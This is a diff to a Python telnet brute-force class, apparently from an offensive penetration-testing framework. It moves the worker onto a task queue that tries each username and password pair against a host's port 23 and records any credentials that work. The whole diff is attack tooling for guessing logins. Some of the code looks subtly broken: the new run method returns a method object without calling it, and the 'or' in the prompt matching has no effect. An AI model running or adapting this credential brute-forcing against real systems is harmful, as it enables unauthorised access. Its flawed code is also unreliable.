@@ -9,30 +9,32 @@ class Telnetbruteforce(_Bruteforce):
         super(Telnetbruteforce, self).__init__()
         self.single_port = 23
 
-    def worker(self, user, password):
-        try:
-            tn = telnetlib.Telnet(host=self.host, port=self.single_port, timeout=2)
-            tn.read_until((b"login: " or b"Login: " ))
-            tn.write(user.encode("ascii") + b"\n")
-            tn.read_until((b"Password: " or b"password: "))
-            tn.write(password.encode("ascii") + b"\n")
-            tn.write(b"dir\n")
-            tn.write(b"exit\n")
-            tn.read_all()
-            tn.close()
-            self.print_result(user, password, error=False)
-            self.lock.acquire()
-            self.add_credential(user, password, "telnet")
-            self.lock.release()
-        except:
-            if (self.verb):
-                self.print_result(user, password, error=True)
+    def worker(self):
+        while(not self.tasks_queue.empty()):
+            task = self.tasks_queue.get()
+            if task is None:
+                break
             try:
+                tn = telnetlib.Telnet(host=self.host, port=self.single_port, timeout=2)
+                tn.read_until((b"login: " or b"Login: " ))
+                tn.write(task["user"].encode("ascii") + b"\n")
+                tn.read_until((b"Password: " or b"password: "))
+                tn.write(task["password"].encode("ascii") + b"\n")
+                tn.write(b"dir\n")
+                tn.write(b"exit\n")
+                tn.read_all()
                 tn.close()
+                self.print_result(task["user"], task["password"], error=False)
+                self.add_credential(task["user"], task["password"], "telnet")
             except:
-                pass
-        self.num_threads -= 1
-        sys.exit(0)
+                if (self.verb):
+                    self.print_result(task["user"], task["password"], error=True)
+                try:
+                    tn.close()
+                except:
+                    pass
+
+            self.tasks_queue.task_done()
 
     def run(self):
         try:
@@ -48,6 +50,4 @@ class Telnetbruteforce(_Bruteforce):
                 print("It doesn't work with that kind of telnet")
             return None, None
 
-        super(Telnetbruteforce, self).run()
-
-        return self.sessions, self.credentials
+        return super(Telnetbruteforce, self).run
